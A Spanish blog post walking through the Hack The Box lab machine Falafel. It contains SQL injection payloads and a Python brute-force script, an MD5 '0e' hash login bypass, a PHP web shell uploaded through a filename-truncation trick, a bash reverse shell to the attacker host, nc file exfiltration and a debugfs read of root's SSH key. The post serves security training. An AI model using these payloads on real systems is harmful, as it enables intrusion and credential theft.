---
layout: post
title: HTB_Falafel
date: 2023/07/10
slug: HTB_Falafel
heroImage: /assets/machines.jpg
---

# Falafel {-}

## Introduccion {-}

La maquina del dia 26/08/2021 se Falafel.

El replay del live se puede ver aqui

[![S4vitaar Falafel maquina](https://img.youtube.com/vi/CIAwmGsHfWk/0.jpg)](https://www.youtube.com/watch?v=CIAwmGsHfWk)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.73
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.73
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.73 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,2222 10.10.10.73 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta?           |
| ------ | -------- | ------------------ | -------------------- |
| 22     | ssh      | Conneccion directa | usuario y contraseña |
| 80     | http     | Web, Fuzzing       |                      |




### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.73
```

Vemos un dominio 
```bash
 falafel.htb 
```
 y poco mas. Añadimos el dominio al 
```bash
 /etc/hosts 
```


#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.73/FUZZ
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,php-txt http://10.10.10.73/FUZZ.FUZ2Z
```

Aqui vemos routas importantes como:

- robots.txt
- login.php
- upload.php
- cyberlaw.txt

#### Analyzando la web con Firefox {-}

Analyzando la web vemos que hay un email 
```bash
 IT@falafel.htb 
```
, aqui podemos pensar que IT es un usuario. Vemos el panel de login.
Si miramos por la url 
```bash
 http://10.10.10.73/cyberlaw.txt 
```
 vemos el contenido de un email enviado por 
```bash
 admin@falafel.htb 
```
 a 
```bash
 lawyers@falafel.htb 
```
 y a 

```bash
 devs@falafel.htb 
```
. El email nos dice que un usuario llamado 
```bash
 chris 
```
 a contactado a 
```bash
 admin@falafel.htb 
```
 para decirle que a podido logearse con este usuario
sin proporcionar contraseña y que a podido tomar el control total de la web usando la functionalidad du subida de imagenes. No se sabe como lo a echo.

Si vamos al panel de login y probamos con los usuarios encontrado, vemos un mensaje differente para los usuarios admin y chris que por los usuarios dev y lawyers.
Nos hace pensar que admin y chris son validos.

El usuario a podido entrar por la funccion de upload de imagenes. Si intentamos ir a la url 
```bash
 http://10.10.10.73/upload.php 
```
 hay una redireccion automatica hacia el
panel de login. Comprobamos con Burpsuite si el redirect a sido sanitizado correctamente.

### Control de la redireccion con Burpsuite {-}

Primeramente controlamos si burpsuite intercepta no unicamente las requests pero tambien las respuestas al lado del servidor. Si es el caso,
lanzamos una peticion desde el navigador al la url 
```bash
 http://10.10.10.73/upload.php 
```
 y cuando interceptamos el 302 Redirect, lo cambiamos a 200 pero en este
caso parece que la redirection a sido bien sanitizada porque solo vemos una pagina en blanco.


## Vulnerability Assessment {-}

### Blind SQL Injection {-}

Como no podemos utilizar el 
```bash
 upload.php 
```
 solo nos queda que intentar cosas con el panel de login.
Como sabemos que el usuario **admin** existe, probamos cosas como:

- admin:test -> Wrong identification: admin
- admin':test -> Try Again
- admin' and sleep(5)-- -:tes -> Hacking attempt detected
- ():test -> Try Again
- sleep:test -> Hacking attempt detected
- admin' order by 100-- -:test -> Try Again
- admin' order by 3-- -:test -> Wrong identification: admin
- admin' order by 4-- -:test -> Wrong identification: admin
- admin' order by 5-- -:test -> Try Again
- admin' union select 1,2,3,4-- -:test -> Hacking attempt detected
- select:test -> Try Again
- union:test -> Hacking attempt detected
- dsafdasdfuniondasfasdf:test -> Hacking attempt detected

Estas pruebas nos dan, como informacion, que el panel de login parece ser vulnerable a SQLI, que palabras como union o sleep estan black listeadas y 
que la respuesta de la llamada SQL tiene 4 columnas. Vamos a validar la respuesta de la web en caso de un error y en caso de una buena formula.

- admin' and substring(username,1,1)='a'-- -:test -> Wrong identification: admin
- admin' and substring(username,1,1)='b'-- -:test -> Try Again
- admin' and substring(username,2,1)='d'-- -:test -> Wrong identification: admin
- admin' and substring(username,2,1)='w'-- -:test -> Try Again

Aqui ya vemos que typo de ataque podriamos hacer y tito s4vitar nos quiere enseñarnos como hacer un ataque de typo Cluster Bomb con BurpSuite aunque tiraremos de
un script en python que es mucho mas agil.

#### Cluster Bomb attack con BurpSuite {-}

1. Interceptamos y modificamos la SQLI desde BurpSuite


![Falafel-SQLI-itercet](/assets/images/Falafel-SQLI-intercept.png) 
1. Con Ctrl+i lo enviamos al intruder
1. En el nodo Positions damos al boton 
```bash
 clear § 
```
 y selectionamos:
    
    - el primer 1 y le damos al boton 
```bash
 add § 
```

    - la letra a y le damos al boton 
```bash
 add § 
```

    - cambiamos el attack type para que valga 
```bash
 Cluster Bomb 
```


    ```{r, echo = FALSE, fig.cap="Burp Cluster Bomb config", out.width="90%"}
        knitr::include_graphics("images/Falafel-ClusterBomb-config-payload.png")
   
![Falafel-ClusterBomb-cofi-ayload](/assets/images/Falafel-ClusterBomb-config-payload.png) 
    - cambiamos el payload type a Numbers
    - cambiamos el Number range en sequential From 1 To 5 con step de 1
    - sacamos el URL encode del final de la pagina

    ```{r, echo = FALSE, fig.cap="Burp Cluster Bomb config set 1", out.width="90%"}
    knitr::include_graphics("images/Falafel-ClusterBomb-config-payload1.png")
    ```

    - cambiamos el Character set a 
```bash
 abcdefghijklmnopqrstuvwxyz 
```
 con un Min length de 1 y un Max length de 1
![Falafel-ClusterBomb-cofi-ayload1](/assets/images/Falafel-ClusterBomb-config-payload1.png) 
    - sacamos el URL encode del final de la pagina

    ```{r, echo = FALSE, fig.cap="Burp Cluster Bomb config set 2", out.width="90%"}
    knitr::include_graphics("images/Falafel-ClusterBomb-config-payload2.png")
    ```

1. En el nodo Options En el Grep - Match

    ```{r, echo = FALSE, fig.cap="Burp Cluster Bomb config matcher", out.width="90%"}
![Falafel-ClusterBomb-cofi-ayload2](/assets/images/Falafel-ClusterBomb-config-payload2.png) 
    knitr::include_graphics("images/Falafel-ClusterBomb-config-matcher.png")
    ```
    
1. Le damos al boton start attack

Aqui vemos que el resultado es un poco complicado pero se podria hacer de esta forma.

#!/usr/bin/python3
![Falafel-ClusterBomb-cofi-matcher](/assets/images/Falafel-ClusterBomb-config-matcher.png) 
#coding: utf-8

import requests
import pdb
import signal
import time
import sys

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://10.10.10.73/login.php"
s = r'abcdef0123456789'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p2 = log.progress("Password")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    password = ""

    for position in range(1, 40):
        for character in s:
            p1.status("Probando caracter %c en la posiciÃ³n %d" % (character, position))
            post_data = {
                'username': "chris' and substring(password,%d,1)='%c'-- -" % (position, character),
                'password': 'admin'
            }

            r = requests.post(login_url, data=post_data)

            if "Wrong identification" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    makeRequest()
```

Cambiando el nombre de usuario, podemos buscar la contraseña del usuario chris y admin. una vez lanzado el script, podemos recoger 
la contraseña md5 de cada uno de estos usuarios.

### Crackeamos las contraseñas con crackstation {-}

Abrimos la web de [crackstation](https://crackstation.net/) y colamos los hashes. Encontramos la contraseña del usuario 
```bash
 chris 
```
.

### Loggearse como el usuario admin {-}

Aqui es donde viene toda la parte mas interesante de la maquina. Si nos connectamos como el usuario **chris** vemos que habla de juggling pero poco mas.
Si intentamos connectar a la url 
```bash
 http://10.10.10.73/upload.php 
```
 todavia hay una redireccion. Como habla de juggling, pensamos en seguida en una vulnerabilidad
de typo **type juggling** pero tampoco es esto. Esta via se parece mas a un rabbit hole que otra cosa.

Si analyzamos las contraseñas, mejor dicho los hashes encontrados:

- admin:0e462096931906507119562988736854
- chris:d4ee02a22fc872e36d9e3751ba72ddc8

Nos damos cuenta que el hash del usuario chris contiene letras y numeros pero la del usuario admin solo contiene numeros. Porque digo que solo contiene numeros?
Porque si pensamos en forma mathematica, la letra 
```bash
 e 
```
 corresponde a un **por 10 elevado a** (en este caso 0 por 10 elevado a 462096931906507119562988736854) al final
solo son numeros.

La vulnerabilidad aqui viene si dos condiciones existen:

1. En 
```bash
 php 
```
 la comparativa esta exprimida con un 
```bash
 == 
```
 y no con un 
```bash
 === 
```

1. Si el hash md5 de una contraseña empieza por 0e*xxxxxxxxxxxx...*

Porque succede esta vulnerabilidad? Porque si los hashes de las 2 contraseñas empiezan por 0e*xxx...* y que la comparativa es unicamente de doble igual, como no 
va a comparar de manera stricta, 0 por 10 elevado a cualquier cos (que vale 0) comparado a 0 por 10 elevado a cualquier otra cosa (que tambien vale 0) **SON IGUALES**.

Si miramos por google por 
```bash
 0e hash collision 
```
 por ejemplo el articulo de [ycombinator](https://news.ycombinator.com/item?id=9484757), vemos quel hash md5 de 
```bash
 240610708 
```

da un hash 
```bash
 0e462097431906509019562988736854 
```
 o el hash md5 de 
```bash
 QNKCDZO 
```
 nos da 
```bash
 0e830400451993494058024219903391 
```
.

En php, si la comparativa es con un doble igual, estos dos hashes son iguales. Si vamos a la pagina de login y entramos el usuario *admin* y la contraseña *QNKCDZO*,
conseguimos loggearnos como el usuario admin.

### Burlar el upload de imagenes {-}

Una vez loggeados entramos en el panel de upload. Aqui la web nos pone de uploadear una imagen desde una url. Recuperamos una imagen de pollo en la web y la copiamos
en nuestro directorio de trabajo. Lanzamos un servidor web con python 
```bash
 python3 -m http.server 80 
```
 y uploadeamos el fichero desde la web poniendo la url 
```bash
 http://10.10.14.15/madafackingchicken.png 
```
.

Aqui nos sale un Output con el commando lanzado por la maquina victima :

```bash
CMD: cd /var/www/html/uploads/0026-2354_e426c9e8c2f64caa; wget 'http://10.10.14.15/madafackingchicken.png'
```

Si miramos en la url 
```bash
 http://10.10.10.73/uploads/0026-2354_e426c9e8c2f64caa/madafackingchicken.png 
```
 vemos la imagen del pollo que hemos enviado a la web.

#### wget vulnerabilidad {-}

Tito S4vitar nos avanza aqui que el programa solo permite enviar ficheros con extension 
```bash
 png 
```
 o sea ya sabemos que no podemos enviar ficheros 
```bash
 .php 
```
. Pero como
conocemos el commando echo por la maquina victima, y vemos que se utiliza el commando wget, ya tenemos una via potencial de ataque, el nombre de caracteres del nombre del fichero.
En linux, un fichero solo puede tener un nombre de fichero inferior a 255 caracteres incluida la extension. En el caso de un ficher 
```bash
 .png 
```
, el limite maximo de un fichero
seria un nombre de 251 caracteres seguidos de la extension 
```bash
 .png 
```
.

Copiando el resultado del comando 
```bash
 python -c "A"*251 + ".png" 
```
 y cambiando el nombre del fichero 
```bash
 madafackingchicken.png 
```
 con ello, si uploadeamos este fichero en la web,
vemos que en el resultado de **Saving To** que solo guarda un 235 "A" como nombre de fichero. Esto quiere decir que si enviamos un ficher que tiene como nombre 
```bash
 231 A 
```
 con una extesion 
```bash
 .php.png 
```

la web va a ver que el fichero es un ficher 
```bash
 .png 
```
 pero al momento de guardarlo, va a guardar los 235 primeros caracteres que equivalen a 
```bash
 231 A 
```
 y la extension 
```bash
 .php 
```


Creamos un fichero php

```php
touch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png
vi AAAAAA*

<?php
    echo "<pre>" .shell_exec($_REQUEST['cmd']) ."</pre>";
?>
```

Si enviamos este fichero, vemos que el fichero se a enviado como fichero **.png** pero salvado como fichero **.php** si vamos a la url 
```bash
 http://10.10.10.73/uploads/0026-2354_e426c9e8c2f64caa/AAAAAAAAAA.......AAAA.php?cmd=whoami 
```

vemos que somos 
```bash
 www-data 
```
.
## Vuln exploit & Gaining Access {-}

### Ganando accesso desde la s4vishell.php {-}

1. Creamos un fichero index.html con el contenido siguiente

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.15/443 0>&1
    ```

1. lanzamos un servidor web con python

    ```bash
    python3 -c http.server 80
    ```

1. nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. desde la web lanzamos el comando 
```bash
 http://10.10.10.73/uploads/0026-2354_e426c9e8c2f64caa/AAAAAAAAAA.......AAAA.php?cmd=curl 10.10.14.15 | bash 
```


ganamos accesso al systema como el usuario www-data

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Vemos aqui que no podemos leer la flag porque no podemos entrar en las carpetas de **yossi** o de **moshe**. Tenemos que hacer un user pivoting.

### User Pivoting {-}

```bash
whoami
cd /home
cd yossi
cd moshe
sudo -l
find \-perm -4000 2/dev/null
cd /var/www/html
ls
cat connection.php
```

Aqui vemos que no tenemos permisos interesantes pero vemos en el ficher 
```bash
 connection.php 
```
 unas credenciales para el usuario 
```bash
 moshe 
```
 para la base de datos.

```bash
su moshe
Password:

whoami
#Output
moshe

cat /home/moshe/user.txt
```

Ahora que tenemos la flag, pasamos a la parte **PrivEsc**
## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
uname -a
lsb_release -a
sudo -l
id
```

Aqui llama el atencion el grupo video. Pero aqui primero la idea es ver que grupo tiene este mismo grupo por script.

```bash
groups
for group in $(groups); do echo "El grupo $group"; done
for group in $(groups); do echo -e "\n[+] Listando archivos del sistema con grupo $group asignado:\n"; find / \-group $group 2>/dev/null; done
```

Aqui vemos que el fichero 
```bash
 /dev/fb0 
```
 esta en el grupo **video**. Este servicio permite hacer una captura de pantalla de la maquina.

1. Recoger las proporciones de la pantalla

    ```bash
    cd /
    find \-name virtual_size 2>/dev/null
    cat ./sys/devices/pci0000:00/0000:00:0f.0/graphics/fb0/virtual_size
    #Output
    1176.885
    ```

1. Captura de la pantalla

    ```bash
    cd /tmp
    cat /dev/fb0 > Captura
    du -hc Captura
    file Captura
    ```

1. Enviamos la captura a nuestra maquina de atacante

    - en la maquina de atacante

        ```bash
        nc -nlvp 443 > Captura
        ```

    - en la maquina victima

        ```bash
        nc 10.10.14.15 443 < Captura
        ```

1. Abrimos la captura con Gimp

    - Aun que la apertura del fichero a fallado le damos al menu Archivo > Abrir 
    - Seleccionamos el typo de archivo Datos de imagen en bruto

        ```{r, echo = FALSE, fig.cap="Gimp - Archive brute data", out.width="90%"}
        knitr::include_graphics("images/Falafel-open-capture.png")
        ```

    - Entramos la proporciones de la virtual_size

Aqui podemos ver la contraseña del usuario yossi. Cambiamos de usuario con el comando 
```bash
 su yossi 
```
.

Desde aqui volmemos a intentar a rootear la maquina desde el usuario yossi.

```
![Falafel-oe-cature](/assets/images/Falafel-open-capture.png) 

Como otra vez un grupo, en este caso el grupo disk nos llama la atencion, volmemos a hacer lo mismo con el listeo de ficheros de cada grupo

```bash
for group in $(groups); do echo -e "\n[+] Listando archivos del sistema con grupo $group asignado:\n"; find / \-group $group 2>/dev/null; done
```

Aqui vemos que 
```bash
 /dev/sda1 
```
 es parte del grupo disk. Si le hacemos un ``ls -l /dev/sda1` podemos ver que el grupo disk tiene derecho de escritura. 
Controlamos si estamos en 
```bash
 /dev/sda1 
```
 con el comando 
```bash
 fdisk -l 
```
 y vemos que es el disco con 7G (El mas grande = el disco en uso).

Siendo del grupo disk, nos permite abrir la utilidad 
```bash
 debugfs 
```
 que nos permite manejar utilidades del disco como root.

```bash
debugfs /dev/sda1
pwd
ls
cd /root
pwd
cat root.txt
```

Aqui podemos ver la flag, pero nosotros queremos ser root. Continuamos

```bash
cd .ssh
cat id_rsa
```

la copiamos y creamos un fichero id_rsa en /tmp

```bash
exit
cd /tmp
nano id_rsa

chmod 600 id_rsa
ssh root@localhost -i id_rsa
whoami
#Output 

root
```
